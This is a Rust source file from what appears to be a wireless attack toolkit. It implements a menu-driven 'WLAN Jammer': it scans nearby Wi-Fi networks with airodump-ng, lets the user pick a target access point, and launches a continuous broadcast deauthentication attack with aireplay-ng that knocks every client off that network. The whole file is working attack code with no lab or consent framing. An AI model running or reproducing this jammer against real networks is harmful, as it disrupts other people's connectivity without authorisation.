use dialoguer::{theme::ColorfulTheme, Select};
use pnet::datalink;
use std::process::{Command, Stdio};
use std::io::{BufRead, BufReader};
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone)]
struct WifiNetwork {
    bssid: String,
    channel: String,
    essid: String,
    power: String,
}

pub fn run() {
    let selections = &["Select Monitor Interface and Start Jammer", "Back"];

    loop {
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("WLAN Jammer Menu")
            .default(0)
            .items(&selections[..])
            .interact()
            .unwrap();

        match selections[selection] {
            "Select Monitor Interface and Start Jammer" => select_interface(),
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn select_interface() {
    let interfaces = datalink::interfaces();
    let wireless_interfaces: Vec<_> = interfaces
        .iter()
        .filter(|iface| iface.name.starts_with("wl") || iface.name.contains("wlan") || iface.name.starts_with("mon"))
        .collect();

    if wireless_interfaces.is_empty() {
        println!("No wireless interfaces found.");
        println!("Make sure you have configured a monitor mode interface first.");
        return;
    }

    let interface_names: Vec<String> = wireless_interfaces
        .iter()
        .map(|iface| {
            let mode = if check_monitor_mode(&iface.name) {
                "Monitor Mode"
            } else {
                "Managed Mode"
            };
            format!("{} ({}) [{}]", iface.name, iface.mac.unwrap_or_default(), mode)
        })
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Monitor Interface")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    let selected_interface = wireless_interfaces[selection].name.clone();
    
    // Check if in monitor mode
    if !check_monitor_mode(&selected_interface) {
        println!("\nError: Interface {} is not in monitor mode!", selected_interface);
        println!("Please use 'Change Card Mode' from the Wireless menu to enable monitor mode first.\n");
        
        let options = vec!["Back"];
        let _selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Press Enter to go back")
            .default(0)
            .items(&options[..])
            .interact()
            .unwrap();
        return;
    }
    
    attack_menu(&selected_interface);
}

fn attack_menu(interface: &str) {
    let mut selected_network: Option<WifiNetwork> = None;

    loop {
        // Validate interface still exists
        if !interface_exists(interface) {
            println!("\nError: Interface {} no longer exists!", interface);
            println!("The interface may have been removed or driver crashed.");
            println!("Returning to main menu...\n");
            thread::sleep(Duration::from_secs(2));
            break;
        }

        let network_info = if let Some(ref network) = selected_network {
            format!("Selected: {} ({})", network.essid, network.bssid)
        } else {
            "No network selected".to_string()
        };

        let mut options = vec!["Scan and Select Network"];
        
        if selected_network.is_some() {
            options.push("Start Jamming Attack");
        }
        options.push("Back");

        println!("\n{}\n", network_info);

        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Attack Menu")
            .default(0)
            .items(&options[..])
            .interact()
            .unwrap();

        match options[selection] {
            "Scan and Select Network" => {
                selected_network = scan_and_select_network(interface);
            }
            "Start Jamming Attack" => {
                if let Some(ref network) = selected_network {
                    start_jamming(interface, network);
                }
            }
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn interface_exists(interface: &str) -> bool {
    let output = Command::new("ip")
        .args(&["link", "show", interface])
        .output();

    match output {
        Ok(output) => output.status.success(),
        Err(_) => false,
    }
}

fn check_monitor_mode(interface: &str) -> bool {
    let output = Command::new("iwconfig")
        .arg(interface)
        .output();

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        stdout.contains("Mode:Monitor")
    } else {
        false
    }
}

fn channel_to_frequency(channel: &str) -> String {
    // Convert channel number to frequency in MHz
    // 2.4 GHz band: channels 1-14
    // 5 GHz band: channels 36-165
    match channel.parse::<u32>() {
        Ok(ch) => {
            let freq = if ch >= 1 && ch <= 14 {
                // 2.4 GHz band
                2407 + (ch * 5)
            } else if ch >= 36 && ch <= 165 {
                // 5 GHz band
                5000 + (ch * 5)
            } else {
                // Unknown channel, default to 2.4 GHz calculation
                2407 + (ch * 5)
            };
            freq.to_string()
        }
        Err(_) => {
            // If parsing fails, return default (channel 1)
            "2412".to_string()
        }
    }
}

fn scan_and_select_network(interface: &str) -> Option<WifiNetwork> {
    // Validate interface before scanning
    if !interface_exists(interface) {
        println!("Error: Interface {} does not exist!", interface);
        return None;
    }

    if !check_monitor_mode(interface) {
        println!("Error: Interface {} is not in monitor mode!", interface);
        return None;
    }

    println!("Scanning for networks on {}...", interface);
    println!("This will take about 10 seconds...\n");

    // Create temporary file for airodump-ng output
    let temp_file = "/tmp/spofr_scan";
    
    // Start airodump-ng
    let mut child = Command::new("airodump-ng")
        .args(&[
            interface,
            "-w", temp_file,
            "--output-format", "csv",
            "--write-interval", "1"
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();

    if child.is_err() {
        println!("Error: Failed to start airodump-ng.");
        println!("Make sure airodump-ng is installed (aircrack-ng suite).");
        return None;
    }

    // Wait for scan
    thread::sleep(Duration::from_secs(10));

    // Kill airodump-ng
    if let Ok(ref mut process) = child {
        let _ = process.kill();
    }

    // Parse results
    let networks = parse_airodump_csv(&format!("{}-01.csv", temp_file));

    // Clean up temp files
    let _ = Command::new("rm")
        .args(&["-f", &format!("{}-01.csv", temp_file)])
        .status();
    let _ = Command::new("rm")
        .args(&["-f", &format!("{}-01.cap", temp_file)])
        .status();

    if networks.is_empty() {
        println!("No networks found.");
        return None;
    }

    // Display and select network
    let network_list: Vec<String> = networks
        .iter()
        .map(|n| format!("{} | {} | Ch:{} | Pwr:{}", 
            n.essid, n.bssid, n.channel, n.power))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Target Network")
        .default(0)
        .items(&network_list)
        .interact()
        .unwrap();

    Some(networks[selection].clone())
}

fn parse_airodump_csv(filepath: &str) -> Vec<WifiNetwork> {
    let mut networks = Vec::new();
    
    let file = match std::fs::File::open(filepath) {
        Ok(f) => f,
        Err(_) => return networks,
    };

    let reader = BufReader::new(file);
    let mut in_ap_section = false;
    
    for line in reader.lines() {
        if let Ok(line) = line {
            let trimmed = line.trim();
            
            if trimmed.starts_with("BSSID") {
                in_ap_section = true;
                continue;
            }
            
            if trimmed.starts_with("Station MAC") {
                break; // End of AP section
            }
            
            if in_ap_section && !trimmed.is_empty() {
                let parts: Vec<&str> = trimmed.split(',').map(|s| s.trim()).collect();
                
                if parts.len() >= 14 {
                    let bssid = parts[0].to_string();
                    let channel = parts[3].to_string();
                    let power = parts[8].to_string();
                    let essid = parts[13].to_string();
                    
                    // Skip hidden/empty SSIDs
                    if !essid.is_empty() && essid != " " {
                        networks.push(WifiNetwork {
                            bssid,
                            channel,
                            essid,
                            power,
                        });
                    }
                }
            }
        }
    }
    
    networks
}

fn start_jamming(interface: &str, network: &WifiNetwork) {
    // Validate interface before attack
    if !interface_exists(interface) {
        println!("\nError: Interface {} does not exist!", interface);
        println!("The interface may have been removed or driver crashed.");
        return;
    }

    if !check_monitor_mode(interface) {
        println!("\nError: Interface {} is not in monitor mode!", interface);
        return;
    }

    println!("\n=== Starting Deauthentication Attack ===");
    println!("Target: {} ({})", network.essid, network.bssid);
    println!("Channel: {}", network.channel);
    println!("Interface: {}", interface);
    println!("\nSending deauth packets... Press Ctrl+C to stop.\n");

    // Kill any lingering processes that might be using the interface
    let _ = Command::new("pkill")
        .args(&["-9", "airodump-ng"])
        .status();
    let _ = Command::new("pkill")
        .args(&["-9", "aireplay-ng"])
        .status();

    thread::sleep(Duration::from_millis(300));

    // Take interface down and back up to reset state
    let _ = Command::new("ip")
        .args(&["link", "set", interface, "down"])
        .status();
    
    thread::sleep(Duration::from_millis(200));
    
    let _ = Command::new("ip")
        .args(&["link", "set", interface, "up"])
        .status();

    thread::sleep(Duration::from_millis(500));

    // Convert channel to frequency and set it
    let freq = channel_to_frequency(&network.channel);
    
    let channel_output = Command::new("iw")
        .args(&["dev", interface, "set", "freq", &freq])
        .output();

    match channel_output {
        Ok(output) => {
            if !output.status.success() {
                let stderr = String::from_utf8_lossy(&output.stderr);
                println!("Warning: Failed to set channel/frequency: {}", stderr);
                println!("Proceeding anyway - aireplay-ng will attempt to set the channel...");
            }
        }
        Err(e) => {
            println!("Warning: Error setting frequency: {}", e);
            println!("Proceeding anyway - aireplay-ng will attempt to set the channel...");
        }
    }

    thread::sleep(Duration::from_millis(500));

    // Validate interface one more time before attack
    if !interface_exists(interface) {
        println!("\nError: Interface {} disappeared after setting channel!", interface);
        println!("This is likely a driver issue. Try:");
        println!("  1. Reloading the wireless driver");
        println!("  2. Using a different wireless adapter");
        println!("  3. Checking dmesg for driver errors");
        return;
    }

    // Start deauth attack (broadcast to all clients)
    let status = Command::new("aireplay-ng")
        .args(&[
            "--deauth", "0",  // Continuous deauth
            "-a", &network.bssid,  // AP MAC
            interface
        ])
        .status();

    if let Err(e) = status {
        println!("Error: Failed to start attack: {}", e);
        println!("Make sure aireplay-ng is installed (aircrack-ng suite).");
    } else {
        // Check if interface still exists after attack
        if !interface_exists(interface) {
            println!("\n\nWarning: Interface {} disappeared during attack!", interface);
            println!("This is a driver issue. Possible causes:");
            println!("  - Driver crashed");
            println!("  - Hardware issue");
            println!("  - Power management interference");
            println!("\nTry: sudo modprobe -r <driver> && sudo modprobe <driver>");
        }
    }
}
